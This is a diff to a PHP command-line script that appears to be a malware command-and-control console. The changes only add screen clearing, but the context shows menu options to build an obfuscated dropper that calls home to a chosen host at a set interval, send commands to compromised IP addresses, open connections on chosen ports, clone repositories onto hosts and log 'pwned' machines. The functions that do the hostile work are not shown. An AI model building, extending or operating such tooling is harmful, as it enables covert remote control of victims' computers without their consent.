@@ -294,8 +294,8 @@ function queryDB($host, $fetchWhat){
     }
 }
 
-
-menu($clear = "clear");
+(strtolower(php_uname()) == "windows") ? $clears='cls':$clears="clear";
+menu($clears);
 $run = true;
 while ($run) {
     print("\n\033[33;40mPlease select your choice: \n->");
@@ -303,13 +303,14 @@ while ($run) {
     $pw = trim(fgets(STDIN));
     switch (strtolower($pw)) {
         case "cr":
+            system($clears);
             $h = readline("Where are we calling home to?\n->");
             $d = readline("How often should we call home?\n->");
             $ob = readline("Do we need to obfuscate?\n->");
             createDropper($h, $d, "1", $ob);
             break;
         case "s":
-            echo readline_list_history();
+            system($clears);
             $h = readline("Which host are we checking?\n(right now I only accept IP Addresses.)\n->");
             try {
                 sys($h, queryDB($h, "s"));
@@ -318,6 +319,7 @@ while ($run) {
             }
             break;
         case "r":
+            system($clears);
             $h = readline("Please tell me the host.\n->");
             $p = readline("\nWhich port shall we use?\n->");
             try {
@@ -331,6 +333,7 @@ while ($run) {
             }
             break;
         case "c":
+            system($clears);
             try{
                 $h = readline("Which host are we sending the command to?\n(right now I only accept IP Addresses.)\n->");
                 $c = readline("And now the command: \n->");
@@ -340,6 +343,7 @@ while ($run) {
             }
             break;
         case "cl":
+            system($clears);
             try{
                 $h = readline("Which host are we interacting with?\n->");
                 $rep = readline("Repo to clone?\n->");
@@ -349,9 +353,11 @@ while ($run) {
             }
             break;
         case "u":
+            system($clears);
             echo "Will be in future editions.\n";
             break;
         case "a":
+            system($clears);
             try{
                 $h = readline("Who did we pwn my friend?\n->");
                 aHo($h);
@@ -360,6 +366,7 @@ while ($run) {
             }
             break;
         case "ch":
+            system($clears);
             try{
                 $h = readline("Who is it we need to check on?\n->");
                 $b = readline("Is this going to be a batch job?(Y/N)\n->");
@@ -384,6 +391,7 @@ while ($run) {
             menu($clear = "clear");
             break;
         case "q":
+            system($clears);
             echo "\033[33;40mGood bye!\033[0m\n";
             $run = false;
             break;
